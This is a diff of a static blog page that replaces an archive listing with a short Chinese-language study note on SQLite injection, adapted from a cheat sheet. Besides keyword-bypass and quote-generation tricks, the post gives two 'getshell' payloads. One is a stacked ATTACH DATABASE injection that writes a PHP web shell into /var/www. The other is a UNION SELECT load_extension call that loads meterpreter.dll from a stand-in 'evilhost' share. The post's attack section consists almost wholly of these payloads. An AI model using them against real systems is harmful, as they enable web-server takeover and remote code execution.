@@ -20,15 +20,19 @@
     var CONFIG = {"hostname":"550532788.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Cxlover&#39;s blog">
-<meta property="og:url" content="https://550532788.github.io/archives/2020/05/index.html">
+  <meta name="description" content="0x00 前言​    最近尝试了SQLite注入，发现自己不是很能理解，就写了这一篇文章来加深自己的理解。希望对以后的自己有用吧。 参考：http:&#x2F;&#x2F;atta.cked.me&#x2F;home&#x2F;sqlite3injectioncheatsheet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLite基础学习">
+<meta property="og:url" content="https://550532788.github.io/2020/08/10/SQLite%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Cxlover&#39;s blog">
+<meta property="og:description" content="0x00 前言​    最近尝试了SQLite注入，发现自己不是很能理解，就写了这一篇文章来加深自己的理解。希望对以后的自己有用吧。 参考：http:&#x2F;&#x2F;atta.cked.me&#x2F;home&#x2F;sqlite3injectioncheatsheet">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-10T09:44:04.877Z">
+<meta property="article:modified_time" content="2020-08-10T09:44:04.877Z">
 <meta property="article:author" content="Cxlover">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://550532788.github.io/archives/2020/05/">
+<link rel="canonical" href="https://550532788.github.io/2020/08/10/SQLite%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
 
 
 <script id="page-configurations">
@@ -36,12 +40,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Archive | Cxlover's blog</title>
+  <title>SQLite基础学习 | Cxlover's blog</title>
   
 
 
@@ -139,70 +143,129 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">Um..! 8 posts in total. Keep on posting.</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://550532788.github.io/2020/08/10/SQLite%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-static.cnblogs.com/files/cioi/avatar.gif">
+      <meta itemprop="name" content="Cxlover">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxlover's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQLite基础学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-10 17:44:04" itemprop="dateCreated datePublished" datetime="2020-08-10T17:44:04+08:00">2020-08-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2020</span>
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    最近尝试了<code>SQLite</code>注入，发现自己不是很能理解，就写了这一篇文章来加深自己的理解。希望对以后的自己有用吧。</p>
+<p>参考：<a href="http://atta.cked.me/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">http://atta.cked.me/home/sqlite3injectioncheatsheet</a></p>
+<a id="more"></a>
+
+<h3 id="0x01-关键字"><a href="#0x01-关键字" class="headerlink" title="0x01 关键字"></a><code>0x01</code> 关键字</h3><p>​    在<code>sql</code>中绕过关键字一般都是很重要的课题。当然在<code>SQLite</code>中也不例外。</p>
+<table>
+<thead>
+<tr>
+<th>注释</th>
+<th>–</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IF语句</td>
+<td>CASE</td>
+</tr>
+<tr>
+<td>字符串连接符</td>
+<td>||</td>
+</tr>
+<tr>
+<td>字符串截取</td>
+<td>substr(x,y,z)</td>
+</tr>
+<tr>
+<td>生成单引号</td>
+<td>select substr(quote(hex(0)),1,1);</td>
+</tr>
+<tr>
+<td>生成双引号</td>
+<td>select cast(X’22’ as text);</td>
+</tr>
+<tr>
+<td>生成双引号（2）</td>
+<td>.. VALUES (“&lt;?xml version=“</td>
+</tr>
+<tr>
+<td>节省空间的双引号生成</td>
+<td>select replace(“&lt;?xml version=$1.0$&gt;”,”$”,(select cast(X’22’ as text)));</td>
+</tr>
+</tbody></table>
+<h3 id="0x02-getshell-Trick1-ATTACH-DATABASE"><a href="#0x02-getshell-Trick1-ATTACH-DATABASE" class="headerlink" title="0x02 getshell Trick1 - ATTACH DATABASE"></a><code>0x02</code> getshell Trick1 - ATTACH DATABASE</h3><p>​    你可以附加另一个数据库以方便查询。在文件系统上包含另一个已知内容的数据库，比如配置数据库。更有意思的是，如果你指定的文件不存在的话，那么你可以在你有写权限的文件系统上的任意一个位置来创建这个文件。</p>
+<p>观察下面的一段<code>php</code>代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=bob’; ATTACH DATABASE ‘/<span class="keyword">var</span>/www/lol.php’ <span class="keyword">AS</span> lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<span class="meta">&lt;?</span> system($_GET[‘cmd’]); <span class="meta">?&gt;</span>’;--</span><br></pre></td></tr></table></figure>
+
+<p>要求条件：允许堆叠注入。</p>
+<h3 id="0x03-getshell-Trick2-SELECT-load-extension"><a href="#0x03-getshell-Trick2-SELECT-load-extension" class="headerlink" title="0x03 getshell Trick2 - SELECT load_extension"></a><code>0x03</code> getshell Trick2 - SELECT load_extension</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="number">123</span> UNION SELECT <span class="number">1</span>,load_extension(<span class="string">'\\evilhost\evilshare\meterpreter.dll'</span>,<span class="string">'DllMain'</span>);--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    </p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-05-11T15:12:01+08:00"
-              content="2020-05-11">
-          05-11
-        </time>
-      </div>
+      <footer class="post-footer">
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/" itemprop="url">
-            <span itemprop="name">青龙组AreUSerialz</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-05-11T12:10:15+08:00"
-              content="2020-05-11">
-          05-11
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/" itemprop="url">
-            <span itemprop="name">青龙组Notes</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+        
 
 
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/21/%5BSUCTF%202018%5Dannonymous/" rel="prev" title="[SUCTF 2018]annonymous">
+      <i class="fa fa-chevron-left"></i> [SUCTF 2018]annonymous
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/10/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8B%E7%BB%95%E8%BF%87SQLite%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/" rel="next" title="从一道题目看绕过SQLite注入的关键字">
+      从一道题目看绕过SQLite注入的关键字 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
-  </div>
+      </footer>
+    
+  </article>
   
   
-  
-
   
 
 
@@ -255,6 +318,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-关键字"><span class="nav-number">2.</span> <span class="nav-text">0x01 关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-getshell-Trick1-ATTACH-DATABASE"><span class="nav-number">3.</span> <span class="nav-text">0x02 getshell Trick1 - ATTACH DATABASE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-getshell-Trick2-SELECT-load-extension"><span class="nav-number">4.</span> <span class="nav-text">0x03 getshell Trick2 - SELECT load_extension</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
